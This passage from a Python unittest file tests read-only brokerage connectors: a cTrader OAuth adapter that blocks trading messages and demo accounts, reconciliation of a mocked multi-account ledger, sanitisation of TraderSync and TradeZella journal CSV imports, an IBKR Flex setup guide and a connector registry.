            with self.assertRaises(WriteCapableCredentialsRejectedError):
                CTraderReadOnlyOAuthAdapter(
                    access_token="CTRADER_TOK",
                    scope=bad_scope,
                    message_transport=tracking_transport,
                )
        self.assertEqual(calls, [])

        # Server returning permissionScope = SCOPE_TRADE (1) in AccountList response is rejected BEFORE deals!
        server_calls: list[str] = []

        def sneaky_server_transport(msg_type: str, _payload: dict[str, Any]) -> dict[str, Any]:
            server_calls.append(msg_type)
            if msg_type == "ProtoOAGetAccountListByAccessTokenReq":
                return {
                    "permissionScope": 1,
                    "ctidTraderAccount": [{"ctidTraderAccountId": 4001, "isLive": True}],
                }
            raise AssertionError(f"Should never call {msg_type} when server reports trading scope")

        sneaky_adapter = CTraderReadOnlyOAuthAdapter(
            access_token="CTRADER_TOK",
            scope=SCOPE_ACCOUNTS,
            message_transport=sneaky_server_transport,
        )
        with self.assertRaises(WriteCapableCredentialsRejectedError):
            sneaky_adapter.fetch_canonical_ledger(
                blinding_salt_hex=TEST_SALT_HEX,
                period_start_utc="2026-01-01T00:00:00Z",
                period_end_utc="2026-01-31T00:00:00Z",
            )
        self.assertEqual(server_calls, ["ProtoOAGetAccountListByAccessTokenReq"])

        # Hard-block all 5 mutating Open API message types and helper methods client-side!
        expected_blocked = {
            "ProtoOANewOrderReq",
            "ProtoOACancelOrderReq",
            "ProtoOAAmendOrderReq",
            "ProtoOAAmendPositionSLTPReq",
            "ProtoOAClosePositionReq",
        }
        self.assertEqual(CTRADER_BLOCKED_MUTATING_MESSAGE_TYPES, expected_blocked)

        ro_adapter = CTraderReadOnlyOAuthAdapter(
            access_token="CTRADER_TOK",
            scope=SCOPE_ACCOUNTS,
            message_transport=tracking_transport,
        )
        for bad_msg in sorted(CTRADER_BLOCKED_MUTATING_MESSAGE_TYPES):
            with self.assertRaises(DisallowedCapabilityError):
                ro_adapter.send_open_api_message(bad_msg, {"ctidTraderAccountId": 4001})
        for bad_numeric in (2106, 2107, 2108, 2110, 2111):
            with self.assertRaises(DisallowedCapabilityError):
                ro_adapter.send_open_api_message(bad_numeric, {})
        for mut_method in (
            ro_adapter.place_order,
            ro_adapter.cancel_order,
            ro_adapter.amend_order,
            ro_adapter.amend_position_sltp,
            ro_adapter.close_position,
        ):
            with self.assertRaises(DisallowedCapabilityError):
                mut_method()
        self.assertEqual(calls, [])

    def test_ctrader_demo_rejection_and_live_http_reconciliation(self) -> None:
        # Demo host rejected
        with self.assertRaises(PaperOrSandboxAccountRejectedError):
            CTraderReadOnlyOAuthAdapter(
                access_token="CT_TOK",
                base_url="https://demo.openapi.ctrader.com",
            )

        # isLive == False account rejected with PaperOrSandboxAccountRejectedError
        demo_adapter = CTraderReadOnlyOAuthAdapter(
            access_token="CT_TOK",
            message_transport=lambda _m, _p: {
                "permissionScope": 0,
                "ctidTraderAccount": [{"ctidTraderAccountId": 9999, "isLive": False}],
            },
        )
        with self.assertRaises(PaperOrSandboxAccountRejectedError):
            demo_adapter.fetch_canonical_ledger(
                blinding_salt_hex=TEST_SALT_HEX,
                period_start_utc="2026-01-01T00:00:00Z",
                period_end_utc="2026-01-31T00:00:00Z",
            )

        # Live multi-account HTTP/JSON bridge reconciliation (including ProtoVAReconcileReq & moneyDigits=2)
        def mock_ctrader_http(
            method: str,
            url: str,
            headers: dict[str, str],
            body: bytes | None,
        ) -> tuple[int, dict[str, str], Any]:
            self.assertEqual(method, "POST")
            self.assertEqual(headers.get("Authorization"), "Bearer SECRET_CTRADER_OAUTH_TOK")
            req = json.loads((body or b"{}").decode("utf-8"))
            ptype = req["payloadType"]
            payload = req["payload"]
            if ptype == "ProtoOAGetAccountListByAccessTokenReq":
                return (
                    200,
                    {"content-type": "application/json"},
                    {
                        "permissionScope": "SCOPE_VIEW",
                        "ctidTraderAccount": [
                            {"ctidTraderAccountId": 880011, "traderLogin": 300111, "isLive": True, "depositCurrency": "USD"},
                            {"ctidTraderAccountId": 880022, "traderLogin": 300222, "isLive": True, "depositCurrency": "USD"},
                        ],
                    },
                )
            if ptype == "ProtoOADealListReq":
                if payload["ctidTraderAccountId"] == 880011:
                    return (
                        200,
                        {},
                        {
                            "deal": [
                                {
                                    "dealId": 501,
                                    "symbolName": "EURUSD",
                                    "tradeSide": "BUY",
                                    "volume": 100000,
                                    "executionPrice": 1.0820,
                                    "executionTimestamp": 1767580800000,
                                    "moneyDigits": 2,
                                    "commission": -350,
                                },
                                {
                                    "dealId": 502,
                                    "symbolName": "EURUSD",
                                    "tradeSide": "SELL",
                                    "volume": 100000,
                                    "executionPrice": 1.0890,
                                    "executionTimestamp": 1767667200000,
                                    "moneyDigits": 2,
                                    "commission": -350,
                                    "closePositionDetail": {
                                        "moneyDigits": 2,
                                        "grossProfit": 70000,
                                        "swap": -125,
                                        "balance": 5069175,
                                    },
                                },
                            ]
                        },
                    )
                return (200, {}, {"deal": []})
            if ptype == "ProtoOACashFlowHistoryListReq":
                if payload["ctidTraderAccountId"] == 880011:
                    return (
                        200,
                        {},
                        {
                            "depositWithdraw": [
                                {
                                    "operationType": "BALANCE_DEPOSIT",
                                    "moneyDigits": 2,
                                    "delta": 5000000,
                                    "balance": 5000000,
                                    "changeBalanceTimestamp": 1767312000000,
                                    "externalNote": "Bank Wire",
                                }
                            ]
                        },
                    )
                return (200, {}, {"depositWithdraw": []})
            if ptype in {"ProtoOAReconcileReq", "ProtoVAReconcileReq"}:
                if payload["ctidTraderAccountId"] == 880022:
                    return (
                        200,
                        {},
                        {
                            "position": [
                                {
                                    "tradeData": {
                                        "symbolName": "GBPUSD",
                                        "tradeSide": "BUY",
                                        "lots": 0.5,
                                        "openPrice": 1.2600,
                                    },
                                    "price": 1.2600,
                                    "marketValue": 63200.0,
                                }
                            ]
                        },
                    )
                return (200, {}, {"position": []})
            raise AssertionError(f"Unhandled cTrader payloadType {ptype} at {url}")

        live_ct = CTraderReadOnlyOAuthAdapter(
            access_token="SECRET_CTRADER_OAUTH_TOK",
            scope=SCOPE_ACCOUNTS,
            reconcile_message_type="ProtoVAReconcileReq",
            http_transport=mock_ctrader_http,
            env={"N170_CTRADER_COMMERCIAL_APPROVED": "true"},
        )
        self.assertEqual(live_ct.approval_state, ProviderApprovalState.APPROVED_LIVE)
        full_ledger = live_ct.fetch_canonical_ledger(
            blinding_salt_hex=TEST_SALT_HEX,
            period_start_utc="2026-01-01T00:00:00Z",
            period_end_utc="2026-01-31T00:00:00Z",
        )
        self.assertEqual(full_ledger.account_scope, AccountScope.ALL_ENUMERATED_SUBACCOUNTS)
        self.assertEqual(full_ledger.enumerated_subaccount_count, 2)
        self.assertEqual(full_ledger.connected_subaccount_count, 2)
        self.assertEqual(full_ledger.claimed_origin_assurance, OriginAssurance.OPERATOR_RETRIEVED)
        self.assertEqual(len(full_ledger.trades), 2)
        self.assertAlmostEqual(full_ledger.trades[0].quantity, 1.0)
        self.assertAlmostEqual(full_ledger.trades[0].commission, 3.50)
        self.assertEqual(len(full_ledger.flows), 2)  # 50,000.00 deposit + -1.25 swap
        self.assertAlmostEqual(full_ledger.nav_points[-1].nav_base, 50_691.75)
        self.assertEqual(len(full_ledger.ending_positions), 1)
        dumped_ct = json.dumps(full_ledger.to_dict())
        self.assertNotIn("880011", dumped_ct)
        self.assertNotIn("300111", dumped_ct)
        self.assertNotIn("SECRET_CTRADER_OAUTH_TOK", dumped_ct)

        subset_ledger = live_ct.fetch_canonical_ledger(
            blinding_salt_hex=TEST_SALT_HEX,
            period_start_utc="2026-01-01T00:00:00Z",
            period_end_utc="2026-01-31T00:00:00Z",
            selected_account_ids=[880011],
        )
        self.assertEqual(
            subset_ledger.account_scope,
            AccountScope.SINGLE_ACCOUNT_SURVIVORSHIP_UNVERIFIED,
        )


class TestJournalMigrationSetupGuideAndRegistry(unittest.TestCase):
    def test_tradersync_and_tradezella_migration_tags_sanitization_and_insufficient_sections(self) -> None:
        tradersync_csv = (
            "Status,Symbol,Size,Open Date,Open Time,Close Date,Close Time,Entry Price,Exit Price,Return $,Side,Setups,Mistakes,Commission,Notes,Asset Type\n"
            "WIN,NVDA,100,2026-01-06,09:35:00,2026-01-06,10:45:00,138.00,142.50,448.00,LONG,"
            "\"  =ORB Breakout; +VWAP Hold\",\"-Moved Stop\",2.00,\"  @Great patience on pullback\",STOCK\n"
            "OPEN,AAPL,25,2026-01-20,14:00:00,,,220.00,,,LONG,Swing Pullback,,1.00,\t=Watching earnings,STOCK\n"
        )
        ts_mig = parse_journal_migration_csv(tradersync_csv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertIsInstance(ts_mig, JournalMigrationResult)
        self.assertEqual(ts_mig.detected_format, "tradersync_journal")
        self.assertEqual(ts_mig.origin_assurance, OriginAssurance.SELF_REPORTED)
        self.assertEqual(ts_mig.account_scope, AccountScope.UNKNOWN_OFFLINE_SCOPE)
        self.assertEqual(
            ts_mig.reconciliation_status_override,
            ReconciliationStatus.INSUFFICIENT_SECTIONS,
        )
        self.assertEqual(
            ts_mig.imported_journal_tags,
            ["ORB Breakout", "VWAP Hold", "Moved Stop", "Swing Pullback"],
        )
        for tag in ts_mig.imported_journal_tags:
            self.assertFalse(tag.startswith(("=", "+", "-", "@", "\t", "\r", "\n", " ")))
        for note in ts_mig.sanitized_trade_notes:
            self.assertFalse(note.startswith(("=", "+", "-", "@", "\t", "\r", "\n", " ")))

        # Closed NVDA (2 legs) + Open AAPL (1 leg + 1 ending_position), 0 verified NAV points
        self.assertEqual(len(ts_mig.ledger.trades), 3)
        self.assertEqual(len(ts_mig.ledger.ending_positions), 1)
        self.assertEqual(ts_mig.ledger.nav_points, [])

        # Confirm ReconciliationEngine independently classifies migrated journal ledger as INSUFFICIENT_SECTIONS
        recon = reconcile_portfolio_ledger(ts_mig.ledger)
        self.assertEqual(recon.status, ReconciliationStatus.INSUFFICIENT_SECTIONS)

        # TradeZella futures journal migration
        tradezella_csv = (
            "Open Date,Close Date,Symbol,Side,Volume,Entry Price,Exit Price,Net P&L,Commissions,Playbook,Mistake Tags,Custom Tags,Notes,Instrument Type\n"
            "2026-01-15 14:31:00,2026-01-15 15:02:00,MESZ5,Long,4,5800.00,5815.00,$295.20,4.80,Opening Range,None,+A+ Execution,  -Followed plan,Future\n"
        )
        tz_mig = JournalMigrationOfflineAdapter(source_hint="tradezella").migrate_export(
            tradezella_csv, blinding_salt_hex=TEST_SALT_HEX
        )
        self.assertEqual(tz_mig.detected_format, "tradezella_journal")
        self.assertEqual(
            tz_mig.reconciliation_status_override,
            ReconciliationStatus.INSUFFICIENT_SECTIONS,
        )
        self.assertEqual(tz_mig.imported_journal_tags, ["Opening Range", "A+ Execution"])
        self.assertEqual(tz_mig.ledger.trades[0].multiplier, 5.0)
        self.assertEqual(tz_mig.ledger.trades[0].asset_class, AssetClass.FUTURE)

    def test_ibkr_flex_setup_guide_sections_security_and_privacy_guarantees(self) -> None:
        guide = get_ibkr_flex_setup_guide()
        expected_9 = [
            "EquitySummaryInBase",
            "PriorPeriodPositions",
            "OpenPositions",
            "Trades",
            "CashTransactions",
            "Transfers",
            "CorporateActions",
            "OptionEAE",
            "ConversionRates",
        ]
        self.assertEqual(list(REQUIRED_IBKR_FLEX_SECTIONS), expected_9)
        self.assertEqual(guide.required_sections, expected_9)
        self.assertEqual(guide["required_sections"], expected_9)
        self.assertEqual(len(guide.section_checklist), 9)
        self.assertGreaterEqual(len(guide.steps), 4)
        self.assertEqual(guide.security_settings["token_expiry"], "6h")
        self.assertEqual(guide.security_settings["recommended_token_expiry_hours"], 6)
        self.assertIs(guide.security_settings["ip_restriction"], True)
        self.assertIs(guide.privacy_guarantees["dollar_nav_blinded_locally"], True)
        self.assertIs(guide.privacy_guarantees["raw_account_id_blinded_locally"], True)
        self.assertIn("required_sections", guide)

    def test_connector_registry_preserves_wave1_to_3_and_registers_all_wave4_adapters(self) -> None:
        # Default list_connector_descriptors preserves exact 14 Wave 1-3 descriptors
        core_descriptors = list_connector_descriptors(env={})
        self.assertEqual(len(core_descriptors), 14)

        # Extended list_all_connector_descriptors includes all 5 new Wave 4 canonical adapters (19 total)
        all_descriptors = list_all_connector_descriptors(env={})
        self.assertEqual(len(all_descriptors), 19)
        for desc in all_descriptors:
            validate_read_only_capabilities(desc.allowed_capabilities)

        for bid in (
            "mt4",
            "mt4_statement",
            "mt5",
            "mt5_statement",
            "tradovate",
            "tradovate_csv",
            "ctrader",
            "ctrader_oauth",
            "journal_migration",
            "tradersync",
            "tradezella",
        ):
            self.assertIn(bid, CONNECTOR_CLASS_MAP)
            adapter = create_connector(bid)
            validate_read_only_capabilities(adapter.describe_adapter().allowed_capabilities)
            desc = get_connector_descriptor(bid)
            validate_read_only_capabilities(desc.allowed_capabilities)

        # Verify top-level connectors package exports
        for required_export in (
            "detect_and_parse_statement",
            "DetectedStatementResult",
            "sanitize_csv_text_field",
            "MAX_STATEMENT_BYTES",
            "StatementSizeLimitExceededError",
            "parse_mt4_statement",
            "parse_mt5_statement",
            "Mt5OfflineStatementAdapter",
            "parse_tradovate_csv",
            "TradovateOfflineCsvAdapter",
            "CTraderReadOnlyOAuthAdapter",
            "WriteCapableCredentialsRejectedError",
            "parse_journal_migration_csv",
            "get_ibkr_flex_setup_guide",
        ):
            self.assertIn(required_export, connectors_pkg.__all__)
            self.assertTrue(hasattr(connectors_pkg, required_export))


if __name__ == "__main__":
    unittest.main()
